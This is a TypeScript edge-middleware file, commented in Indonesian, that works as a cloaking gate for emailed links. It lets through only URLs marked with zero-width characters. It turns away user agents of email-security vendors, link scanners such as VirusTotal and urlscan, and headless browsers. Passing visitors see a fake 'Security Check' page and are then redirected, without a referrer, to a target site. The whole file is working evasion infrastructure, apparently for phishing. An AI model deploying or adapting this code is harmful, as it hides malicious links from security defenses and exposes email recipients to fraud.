export const config = {
  runtime: "edge",
};

export default async function middleware(req: Request) {
  const url = new URL(req.url);
  const ua = req.headers.get("user-agent") || "Unknown";
  const uaLower = ua.toLowerCase();
  const ip = req.headers.get("x-real-ip") || req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Unknown";

  // ═══ 1. FILTER FILE STATIS ═══
  if (/favicon|manifest|\.ico|\.png|robots\.txt/.test(url.pathname)) {
    return new Response(null, { status: 204 });
  }

  // ═══ 2. VERIFIKASI TOKEN (SETELAH LOLOS JS CHALLENGE) ═══
  if (url.pathname === "/verify") {
    const token = url.searchParams.get("t");
    const ts = url.searchParams.get("ts");
    const now = Date.now();

    if (token && ts) {
      const elapsed = now - parseInt(ts);
      if (elapsed < 3000) return new Response("Forbidden", { status: 403 });

      const targetUrl = "https://debounce.com";
      const redirectHTML = `<html><head><meta name="referrer" content="no-referrer"><script>
        setTimeout(function(){ window.location.replace("${targetUrl}"); }, 200);
      </script></head><body>Redirecting...</body></html>`;

      return new Response(redirectHTML, {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }
    return new Response("Access Denied", { status: 403 });
  }

  // ═══ 3. PENGECEKAN ZWC (STRICT MODE) ═══
  // Kita cek full URL (termasuk pathname & search params) untuk ZWC
  let decodedFullUrl = "";
  try { 
    decodedFullUrl = decodeURIComponent(url.pathname + url.search); 
  } catch(e) { 
    decodedFullUrl = url.pathname + url.search; 
  }

  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodedFullUrl);

  // JIKA TIDAK ADA ZWC, LANGSUNG BLOKIR (403 atau 404)
  if (!hasZwc) {
    console.log(`❌ BLOCKED (NO ZWC): IP=${ip} | PATH=${url.pathname}`);
    return new Response("Error 403: Forbidden - Access Denied", { status: 403 });
  }

  // ═══ 4. BOT & SECURITY VENDOR DETECTION ═══
  const botUA = [
    "vade", "vadesecure", "proofpoint", "pphosted", "cloudmark", "barracuda", 
    "mimecast", "fireeye", "trellix", "ironport", "sophos", "forcepoint", 
    "websense", "symantec", "messagelabs", "fortinet", "fortigate", "trendmicro", 
    "spamhaus", "spamexperts", "mailguard", "avanan", "abnormal", "bitdefender", 
    "kaspersky", "eset", "mcafee", "agari", "zerospam", "hornetsecurity", 
    "microsoft", "azure", "office", "outlook", "safelinks", "googlebot",
    "bot", "crawl", "spider", "headless", "puppeteer", "selenium", "urlscan", "virustotal"
  ];

  if (botUA.find((kw) => uaLower.includes(kw))) {
    return new Response("Forbidden", { status: 403 });
  }

  // ═══ 5. FINGERPRINT SEDERHANA ═══
  if (uaLower.length < 35 || !req.headers.has("accept-language")) {
    return new Response("Forbidden", { status: 403 });
  }

  // ═══ 6. HALAMAN JS CHALLENGE ═══
  const ts = Date.now();
  const challengeHTML = `<!DOCTYPE html>
  <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Security Check</title>
  <style>
    body{font-family:sans-serif;background:#f4f7f9;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .card{background:#fff;padding:30px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;max-width:350px}
    .spinner{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto 15px}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style></head><body>
  <div class="card"><div class="spinner"></div><h2>Verifying...</h2></div>
  <script>
    (function(){
      var ts = ${ts};
      var interaction = false;
      ['mousemove','touchstart','keydown'].forEach(e => {
        document.addEventListener(e, () => { interaction = true; }, {once:true});
      });
      setTimeout(function(){
        if(navigator.webdriver || window.outerWidth === 0) return;
        var token = btoa(ts + ':' + (interaction ? 'human' : 'passive'));
        window.location.href = '/verify?t=' + encodeURIComponent(token) + '&ts=' + ts;
      }, 4000);
    })();
  </script></body></html>`;

  return new Response(challengeHTML, {
    status: 200,
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}
